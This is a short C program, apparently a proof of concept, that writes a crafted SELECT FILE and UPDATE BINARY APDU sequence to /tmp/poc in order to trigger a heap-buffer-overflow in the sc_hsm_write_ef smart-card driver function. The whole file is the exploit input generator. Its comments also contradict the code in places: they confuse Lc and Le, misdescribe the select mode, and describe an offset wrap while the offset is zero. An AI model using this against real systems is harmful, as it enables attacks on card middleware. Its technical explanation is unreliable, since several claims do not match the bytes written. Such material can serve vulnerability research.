#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    // Construct a valid SC-HSM APDU to trigger heap-buffer-overflow in sc_hsm_write_ef
    // The vulnerability: sc_hsm_write_ef allocates cmdbuff = 8 + count, but memcpy uses
    // buf+offset where offset can exceed count when writing multiple blocks.
    // We need a crafted EF write with count ~32767 and offset > 32767-8 to cause
    // a read of 1224 bytes past the end.

    // SC-HSM command: UPDATE BINARY (CLA=0x00, INS=0xD6, P1=0x00, P2=0x00)
    // Le field specifies the number of bytes to write.
    // We set Le to 32767 (0x7FFF) to trigger the overflow when offset wraps.

    // Write SELECT FILE APDU first (to select the EF)
    fputc(0x00, f); // CLA
    fputc(0xA4, f); // INS
    fputc(0x04, f); // P1 (select by file identifier)
    fputc(0x00, f); // P2
    fputc(0x02, f); // Lc (2 bytes of file ID)
    fputc(0x50, f); // File ID high byte (EF token info)
    fputc(0x15, f); // File ID low byte
    fputc(0x00, f); // Le (no response data expected)

    // Now write UPDATE BINARY command with crafted data
    fputc(0x00, f); // CLA
    fputc(0xD6, f); // INS (UPDATE BINARY)
    fputc(0x00, f); // P1 (offset high byte = 0)
    fputc(0x00, f); // P2 (offset low byte = 0)
    fputc(0x7F, f); // Lc high byte (32767 bytes)
    fputc(0xFF, f); // Lc low byte

    // Write 32767 bytes of data (the count parameter to sc_hsm_write_ef)
    // This will cause cmdbuff allocation of 8+32767 = 32775 bytes
    // But the chunked write loop will use offset that exceeds this
    for (int i = 0; i < 32767; i++) {
        fputc(0x41, f);
    }

    fclose(f);
    return 0;
}